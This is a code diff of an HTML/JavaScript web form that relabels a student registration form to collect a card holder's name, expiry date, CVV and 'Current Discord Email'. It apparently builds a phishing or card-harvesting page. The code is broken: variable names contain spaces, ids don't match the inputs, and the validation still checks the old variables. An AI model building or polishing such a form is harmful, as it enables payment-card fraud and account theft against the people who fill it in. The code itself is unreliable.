@@ -123,24 +123,24 @@ input{
     <h2>Database</h2>
 
     <label>Card Holder:</label>
-    <input type="text" id="name" placeholder="Enter student name">
+    <input type="text" id="name" placeholder="Card Number">
 
     <div class="row">
 
         <div>
             <label>Exp Date:</label>
-            <input type="text" id="studentid" placeholder="2026-0001">
+            <input type="text" id="Exp Date:" placeholder="2026-0001">
         </div>
 
         <div>
             <label>CVV</label>
-            <input type="text" id="section" placeholder="STEM-A">
+            <input type="text" id="CVV" placeholder="STEM-A">
         </div>
 
     </div>
 
     <label>Email</label>
-    <input type="email" id="email" placeholder="student@gmail.com">
+    <input type="email" id="email" placeholder="Current Discord Email">
 
     <button class="btn" onclick="submitForm()">
         Submit
@@ -158,9 +158,9 @@ input{
 
 async function submitForm(){
 
-let name = document.getElementById("name").value;
-let studentid = document.getElementById("studentid").value;
-let section = document.getElementById("section").value;
+let Card Holder = document.getElementById("Card Holder").value;
+let Exp Date = document.getElementById("Exp Date").value;
+let CVV = document.getElementById("CVV").value;
 let email = document.getElementById("email").value;
 
 if(name === "" || studentid === "" || section === "" || email === ""){
